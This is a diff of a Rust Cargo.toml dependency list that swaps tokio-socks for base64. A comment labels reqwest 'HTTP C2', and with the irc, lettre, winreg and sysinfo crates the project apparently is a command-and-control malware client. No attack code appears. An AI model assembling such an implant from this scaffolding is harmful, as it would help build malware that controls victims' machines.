@@ -9,7 +9,6 @@ reqwest = { version = "0.12", features = ["json"] }  # HTTP C2
 serde = { version = "1.0", features = ["derive"] }
 rand = "0.8"
 sysinfo = "0.30"                                     # เช็คระบบ
-tokio-socks = "0.3"
 lettre = { version = "0.11", features = ["tokio1-native-tls"] }
 irc = "0.15"
 winreg = "0.52"
@@ -18,3 +17,4 @@ chrono = "0.4"
 lazy_static = "1.4"
 sha3 = "0.10"
 futures = "0.3"
+base64 = "0.21"
